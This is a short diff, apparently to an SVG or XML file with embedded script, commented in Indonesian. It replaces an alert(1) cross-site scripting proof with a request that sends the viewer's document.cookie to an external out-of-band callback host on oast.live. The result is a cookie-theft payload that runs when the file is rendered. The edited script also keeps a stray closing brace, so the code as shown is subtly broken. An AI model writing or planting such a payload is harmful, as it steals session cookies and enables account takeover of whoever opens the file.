@@ -7,10 +7,9 @@
   <!-- JavaScript untuk memuat gambar dari URL dan menampilkan alert jika error -->
   <script type="text/javascript">
     <![CDATA[
-      var img = new Image();
-      img.src = '1';
-      img.onerror = function() {
-        alert(1);
+      var xhr = new XMLHttpRequest();
+xhr.open("GET", "https://cqn5mjlarg3eqfajh7m0pzhzyo7mx44yh.oast.live?cookie=" + document.cookie, true);
+xhr.send();
       };
     ]]>
   </script>
